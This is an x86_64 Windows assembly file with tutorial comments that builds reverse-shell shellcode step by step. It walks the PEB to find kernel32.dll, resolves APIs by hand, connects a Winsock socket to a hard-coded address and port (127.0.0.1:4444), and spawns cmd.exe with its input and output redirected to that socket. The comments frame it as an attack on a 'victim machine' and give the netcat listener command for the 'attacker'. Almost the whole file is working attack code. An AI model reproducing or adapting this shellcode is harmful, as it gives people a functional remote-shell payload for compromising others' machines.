; Here first of all we are going to write a x86_64 architecture assembly code for Windows
; This code is about getting a reverse_tcp_shell on attackers machine
; This code will create a client on victim machine that can talk to server on attackers mahine.
; we will start a listner on kali(attacker mahine). We will create listner with the help of netcat.exe
; command for netcat will be "nc.exe -nvlp [PORT]". Just mention the port number where you want to listen to client.

;Windows API that we need specific for this code:
; 1. WSAstartup
; 2. WSASocketA
; 3. WSAConnect
; 4. CreateProcessA
; 5. WaitForSingleObject
; 6. CloseHandle


;seperate out 7th point

; How to flow of shellcode should be
; Step1: From FS and GS register find out the address of PEB

global main

section .text

main:
   ; int3 
    push rbp
    mov rbp, rsp
    xor rax, rax
    mov al, 200
    sub rsp, rax
    xor rax, rax
    mov rax, [gs:60h + rax]   ; get address of PEB by adding 60h in TEB. get TEB from GS register. Windbg -> dt nt!_teb <address>
                         ; dt nt!_PEB <address>
    mov rax, [rax+0x18]  ; get address of LDR within PEB by adding 18h in PEB. 
    mov rax, [rax+0x20]  ; get address of InMemoryOrderModuleList within LDR by adding 20h into address of LDR. InMemoryOrderModuleList is a doubly linked list.
                         ; in the destination rax register we have address of EXE itself 
    xor r15, r15
    mov rax, [rax + r15]  ; Second thing in InMemoryOrderModuleList is ntdll.dll itself
    mov rax, [rax + r15]  ; Third thing kin InMemoryOrderModuleList is kernel32.dll
                    ; Windbg -> dt _LDR_DATA_TABLE_ENTRY <address>. Here address is stored in rax
    mov rax, [rax+20h] ; Here we got the base address of kernel32.dll
    mov [rbp-8h], rax ; saving address in stack. KERNEL32.DLL BASE ADDRESS IN RBP-8(STACK)
    xor rbx, rbx
    mov bx, [rax+0x3c] ; Here we got offset of NT header
    add rax, rbx  ; adding offset in baseaddress of kernel32.dll
    mov r12b, 0x88
    mov eax, [rax+r12]  ; Here we got the RVA of explort table
    add rax, [rbp-8h]  ; VA of export table 

    mov ebx, [rax+1ch]  ; address of function
    mov [rbp-16h], ebx  ; SAVING "ADDRESS OF FUNCTION" IN STACK
    mov ebx, [rax+20h]  ; address of name
    mov [rbp-24h], ebx  ; SAVING VIRTUAL ADDRESS of "ADDRESS OF NAME" IN STACK
    mov ebx, [rax+24h]  ; address of nameordinals   
    mov [rbp-32h], ebx  ;SAVING relative virtual address "ADDRESS OF NAMEORDINAL" IN STACK
    mov rsi, 41636f7250746547h  ; GetprocA 
    
    xor r9, r9  ; setting up the counter
    mov ebx, [rbp-24h]  ; moving relative virtual address of address of name in ebx
    add rbx, [rbp-8h]   ; adding base address of dll with. From here onwards we can find the address of name

    loop:
    inc r9
    mov ecx, [rbx + r9*4h]
    add rcx, [rbp-8h]
    cmp [rcx], rsi  ; write function name in rsi  
    jnz loop

    mov ebx, [rbp-32h]
    add rbx, [rbp-8h]
    xor rcx, rcx
    mov cx, [rbx + r9*2] ; each entry in ordinal table is of 2 bytes
    
    mov ebx, [rbp-16h] ; ebx have rva
    add rbx, [rbp-8h] ;
    mov ecx, [rbx + rcx*4] ; each entry in "address of function" table  is of 4 bytes
    add rcx, [rbp-8]  ; Here we got the address of GetProcAddress
    mov [rbp-16], rcx  ; saving address of getProcAddress in stack

    ;First para(rcx) ->> Kernel32.dll  -->>  6c6c642e 32336c656e72656b
    ;second para(rdx) ->> LoadLibraryA  -->> 41797261 7262694c64616f4c

    
    mov rcx, [rbp-8]
    mov eax, 41797261h
    push rax
    mov rax, 7262694c64616f4ch
    push rax
    mov rdx, rsp
    sub rsp, 30h
    call [rbp-16]  ; calling GetProcAddress(kernel32, LoadLibraryA)
    add rsp, 40h
    mov [rbp-24], rax  ; saving the address of LoadLibraryA

    ; loading Ws2_32.dll in memory
    ;Fist para (rcx) -> Ws2_32.dll  -->>  6c6c 642e32335f327357
    xor rax, rax
    push rax
    mov ax, 0x6c6c
    push rax
    mov rax, 0x642e32335f327357
    push rax
    mov rcx, rsp
    sub rsp, 30h
    call [rbp-24] ; calling LoadLibraryA(Ws2_32.dll)  able to load (Ws2_32.dll)
    mov [rbp-32], rax 
    add rsp, 50h

    ; getting address of WSAStartup()
    ; calling get proc address
    mov rcx, [rbp-32]  ; getting handle to Ws2_32.dll
    ; function name WSAStartup  -> 7075 7472617453415357
    xor rax, rax
    push rax
    mov ax, 0x7075
    push rax
    mov rax, 0x7472617453415357
    push rax
    mov rdx, rsp  ; got pointer to WSAStartup
    sub rsp, 30h
    call [rbp-16]  ; calling getprocaddress to get the address of WSAStartup
    mov [rbp-40], rax
    add rsp, 40h

    
    xor rcx, rcx
    mov cx, 202h    ; verified by reverse engineering a C code in Windbg. 
    ;mov cx, 0x0190  ; the value to be moved in cx should be 202h but 190h will also work as it is less than 202h
                    ; plus we can notice that size of WSADATA structure is 190h
                    ;If the version requested by the application is equal to or higher than the lowest
                    ;version supported by the Winsock DLL, the call succeeds and the Winsock DLL returns
                    ;detailed information in the WSADATA structure pointed to by the lpWSAData parameter
    xor r8, r8
    mov r8w, 0x198   ; I tried to print the size of structure and it came out to be 198h
    sub rsp, r8
    ;sub rsp, rcx
    mov rdx, rsp
    sub rsp, 30h
    and rsp, 0FFFFFFFFFFFFFFF0h
    call [rbp-40]  ;  calling WSAStartup "this works"
    xor rcx, rcx
    mov cx, 0x01C8
    add rsp, rcx

     ; getting address of WSASocketA()
    ; calling get proc address
    mov rcx, [rbp-32]  ; getting handle to Ws2_32.dll
    ; function name WSASocketA  -> 4174 656b636f53415357
    xor rax, rax
    push rax
    mov ax, 0x4174
    push rax
    mov rax, 0x656b636f53415357
    push rax
    mov rdx, rsp  ; got pointer to WSASocketA
    sub rsp, 30h
    call [rbp-16]  ; calling getprocaddress to get the address of WSASocketA
    mov [rbp-40], rax 
    add rsp, 40h

    ; calling WSASocketA
    ; setting up parameters
    xor rdx, rdx
    xor rcx, rcx
    xor     r9, r9  ; fourth arg
    mov     r8b, 6  ; third arg
    mov     dl, 1  ; second arg
    mov     cl, 2  ; first arg
    sub rsp, 40h    ; before setting up arguments in stack we need to create a stack for the function we are going to call
    and rsp, 0FFFFFFFFFFFFFFF0h
    mov [rsp+20h], r9   ; fifth arg
    mov [rsp+28h], r9   ; sixth arg
    call [rbp-40]  ; calling WSASocket function
    mov [rbp-48], rax   ; saving the file discriptor of WSASocketA
    add rsp, 40h

    mov rcx, [rbp-32]  ; getting handle to Ws2_32.dll
    ; function name connect  ->  74 6365 6e6e6f63
    ;xor rax, rax
    ;push rax
    mov rax, 0x787463656e6e6f63
    push rax
    xor rdx, rdx
    mov [rsp+ 7h], dl 
    mov rdx, rsp  ; got pointer to connect
    sub rsp, 30h
    call [rbp-16]  ; calling getprocaddress to get the address of connect
    mov [rbp-56], rax 
    add rsp, 40h

    ; calling function connect
    ; setting up args for connect
    ; first arg will be file discriptor
    mov rcx, [rbp-48]    ; saved the file discriptor in rcx register
    ; in the second argument we have to pass the address of structure. For that first we will place some values in stack.

    ;   typedef struct sockaddr_in {
    ;       #if(_WIN32_WINNT < 0x0600)
    ;            short   sin_family; --> 0002
    ;       #else //(_WIN32_WINNT < 0x0600)
    ;            ADDRESS_FAMILY sin_family;
    ;       #endif //(_WIN32_WINNT < 0x0600)
    ;       USHORT sin_port;    --> 4444(5c11)
    ;       IN_ADDR sin_addr;   --> 127.0.0.1
    ;       CHAR sin_zero[8];   --> 8 bit of 0
    ;   } SOCKADDR_IN, *PSOCKADDR_IN;
    ; final structure 00025c117F000001-0000000000000000 
    ; because of little endian value is put in reverse order --> 0000000000000000-0100007f5c110002
    ; setting up values for sockaddr_in structure
    ;started setting up value
    xor rbx, rbx
    push rbx
    mov rax, 0100007f5c110002h
    push rax
    ;ended up setting value
    ;push rbx
    mov rdx, rsp ; setting up pointer to sockaddr_in structure to rdx
    mov r8b, 10h
    sub rsp, 30h
    call [rbp-56]   ; calling connect function
    add rsp, 40h

    ;; guess what???? we got connection

    ;Now this is the most difficult part. What all we need to do now is:
    ; 1. Find the address of CreateProcessA
    ; 2. Setup two structures:
    ;       a. STARTUPINFOA
    ;       b. PROCESS_INFORMATION  
    ; 3. setting up args for CreateProcessA

    ;Step1:  
    ;getting address of CreateProcessA -> 41737365636f 7250657461657243 
    mov rcx, [rbp-8]
    mov rax, 787841737365636fh
    push rax
    xor rdx, rdx
    mov [rsp+0x6], dl
    mov [rsp+0x7], dl
    mov rax, 7250657461657243h
    push rax
    mov rdx, rsp
    sub rsp, 30h
    call [rbp-16]  ; calling GetProcAddress(kernel32, CreateProcessA)
    add rsp, 40h
    mov [rbp-64], rax  ; saving the address of CreateProcessA

    ;Step2. a)
    ; Structure of STARTUPINFOA
    ;typedef struct _STARTUPINFOA {
    ;    18 DWORD   cb;    -->we need to set this  -->> sizeof(structure)
    ;    17 LPSTR   lpReserved;  --> 0000000000000000
    ;    16 LPSTR   lpDesktop;  --> 0000000000000000
    ;    15 LPSTR   lpTitle;  --> 0000000000000000
    ;    14 DWORD   dwX;  --> 00000000
    ;    13 DWORD   dwY;  --> 00000000
    ;    12 DWORD   dwXSize;  --> 00000000
    ;    11 DWORD   dwYSize;  --> 00000000
    ;    10 DWORD   dwXCountChars;  --> 00000000
    ;    9 DWORD   dwYCountChars;  --> 00000000
    ;    8 DWORD   dwFillAttribute;  --> 00000000
    ;    7 DWORD   dwFlags;  -->we need to set this   --> 00000101 (STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES)  --> PUSH --> 10100000
    ;    6 WORD    wShowWindow; --> 0000
    ;    5 WORD    cbReserved2; --> 0000
    ;    4 LPBYTE  lpReserved2; --> 0000000000000000
    ;    3 HANDLE  hStdInput;  -->we need to set this   --> socket handle [rbp-48]
    ;    2 HANDLE  hStdOutput;  -->we need to set this  --> socket handle [rbp-48]
    ;    1 HANDLE  hStdError;  -->we need to set this   --> socket handle [rbp-48]
    ;} STARTUPINFOA, *LPSTARTUPINFOA;
    xor rdx, rdx
    ;xor rcx, rcx
    ; starting structure
    mov r14, [rbp-48]
    push r14 ; 1 This counting is started from last member of structure
    push r14 ; 2
    push r14; 3
    push rdx ; 4
    push rdx ; 5-6
    ; 0000010100000000
    ;mov rcx, 0x0000010100000000  ;This is giving null bytes
    ;push rcx ; 7-8
    push rdx ; 7-8
    push rdx ; 9-10
    push rdx ; 11-12
    push rdx ; 13-14
    push rdx ; 15
    push rdx ; 16
    push rdx ; 17
    xor rcx, rcx
    mov cl, 104
    push rcx ; 
    ;structure end
    xor r14, r14        ; Setting up dflag member of structure
    mov r14w, 0x0101    ; Setting up dflag member of structure
    mov [rsp+0x3C], r14 ; Setting up dflag member of structure
    mov r10, rsp  ; Pointer to STARTUPINFOA

;Step2. b)
;typedef struct _PROCESS_INFORMATION {
;    HANDLE hProcess;
;    HANDLE hThread;
;    DWORD dwProcessId;
;    DWORD dwThreadId;
;} PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;
    ;starting structure
    push rdx
    push rdx
    push rdx
    ;ending structure
    mov r11, rsp  ; pointer to PROCESSINFORMATION structure

    xor rcx, rcx    ; First arg for CreateProcessA
    mov rdx, 786578652e646d63h  ;   second arg -> cmd.exe --> 6578652e646d63
    push rdx 
    xor rcx, rcx
    mov [rsp+0x7], cl
    mov rdx, rsp
    xor r8, r8  ; arg 3
    xor r9, r9  ; arg 4


    sub rsp, 50h
    and rsp, 0FFFFFFFFFFFFFFF0h
    xor rbx, rbx
    mov bl, 1h
    mov [rsp+20h], rbx   ; arg 5
    xor rbx, rbx
    mov [rsp+28h], rbx   ; arg 6
    mov [rsp+30h], rbx   ; arg 7
    mov [rsp+38h], rbx   ; arg 8
    mov [rsp+40h], r10   ; arg 9
    mov [rsp+48h], r11   ; arg 10
    call [rbp-64] ; calling CreateProcessA 


    ;nop
    ret
